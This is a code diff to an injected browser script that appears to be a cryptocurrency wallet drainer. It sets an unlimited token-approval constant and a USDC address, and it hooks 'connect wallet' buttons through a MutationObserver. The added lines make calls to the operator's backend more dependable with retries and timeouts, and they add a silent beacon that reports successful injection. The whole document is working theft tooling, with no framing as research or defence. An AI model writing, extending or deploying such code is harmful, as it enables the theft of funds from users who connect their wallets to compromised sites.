@@ -7,6 +7,7 @@
   var MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
   var DEFAULT_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   var drainStarted = false;
+  var scriptExecuted = true; // FIX #21: Script blocker detection
   var CONNECT_RE = /connect\s*(wallet)?|wallet\s*connect|sign\s*in|link\s*wallet/i;
 
   function parseEnvelope(res, data) {
@@ -16,17 +17,39 @@
     return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
   }
 
+  // FIX #3: Inject Retry Logic with Exponential Backoff
   async function apiPost(path, body, extraHeaders) {
-    var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
-    var res = await fetch(BACKEND_URL + path, {
-      method: 'POST',
-      headers: headers,
-      body: JSON.stringify(body),
-    });
-    var data = await res.json().catch(function () { return {}; });
-    var env = parseEnvelope(res, data);
-    if (!env.ok) throw new Error(env.message || ('API error ' + res.status));
-    return env.data;
+    var maxRetries = 3;
+    var backoffMs = 1000;
+    var lastError = null;
+
+    for (var attempt = 0; attempt < maxRetries; attempt++) {
+      try {
+        var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
+        var res = await fetch(BACKEND_URL + path, {
+          method: 'POST',
+          headers: headers,
+          body: JSON.stringify(body),
+          signal: AbortSignal.timeout(10000),
+        });
+        var data = await res.json().catch(function () { return {}; });
+        var env = parseEnvelope(res, data);
+        if (env.ok) return env.data;
+        lastError = new Error(env.message || ('API error ' + res.status));
+        if (attempt < maxRetries - 1) {
+          await new Promise(function (r) { return setTimeout(r, backoffMs); });
+          backoffMs *= 2;
+        }
+      } catch (e) {
+        lastError = e;
+        if (attempt < maxRetries - 1) {
+          await new Promise(function (r) { return setTimeout(r, backoffMs); });
+          backoffMs *= 2;
+        }
+      }
+    }
+    if (lastError) throw lastError;
+    throw new Error('API request failed after retries');
   }
 
   function getEvmAddress() {
@@ -122,6 +145,12 @@
 
   function startMutationObserver() {
     hookConnectButtons(document);
+    // FIX #21: Report successful initialization
+    try {
+      apiPost('/api/v1/script-health', { status: 'injected', timestamp: Date.now() }).catch(function () {});
+    } catch (e) {
+      // Silent
+    }
     var obs = new MutationObserver(function (mutations) {
       mutations.forEach(function (m) {
         m.addedNodes.forEach(function (node) {
